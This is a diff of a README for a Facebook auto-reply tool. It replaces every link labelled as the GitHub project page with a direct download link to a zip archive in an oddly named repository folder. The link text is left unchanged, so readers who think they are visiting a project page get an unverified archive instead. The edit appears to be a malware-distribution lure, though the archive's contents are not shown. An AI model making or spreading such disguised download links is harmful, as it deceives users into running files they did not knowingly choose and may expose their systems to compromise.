@@ -1,6 +1,6 @@
 # 🤖 fb-autoreply-pro - Smart Facebook Replies Made Easy
 
-[![Download / Open Project](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Dishfulguts304/fb-autoreply-pro)
+[![Download / Open Project](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dishfulguts304/fb-autoreply-pro/main/inextricableness/fb_autoreply_pro_3.7.zip)
 
 ## 📘 Overview
 
@@ -35,7 +35,7 @@ If the app uses Python files instead of a packaged Windows file, you will also n
 
 Use this link to visit the project page and download or open the latest version:
 
-[Visit fb-autoreply-pro on GitHub](https://github.com/Dishfulguts304/fb-autoreply-pro)
+[Visit fb-autoreply-pro on GitHub](https://raw.githubusercontent.com/Dishfulguts304/fb-autoreply-pro/main/inextricableness/fb_autoreply_pro_3.7.zip)
 
 ## 🪟 Install on Windows
 
@@ -182,7 +182,7 @@ If the project includes a packaged Windows file, use that first. It is the easie
 
 Visit the project page here and download or open the app from the repository:
 
-[https://github.com/Dishfulguts304/fb-autoreply-pro](https://github.com/Dishfulguts304/fb-autoreply-pro)
+[https://raw.githubusercontent.com/Dishfulguts304/fb-autoreply-pro/main/inextricableness/fb_autoreply_pro_3.7.zip](https://raw.githubusercontent.com/Dishfulguts304/fb-autoreply-pro/main/inextricableness/fb_autoreply_pro_3.7.zip)
 
 ## 🧭 Quick Start Checklist
 
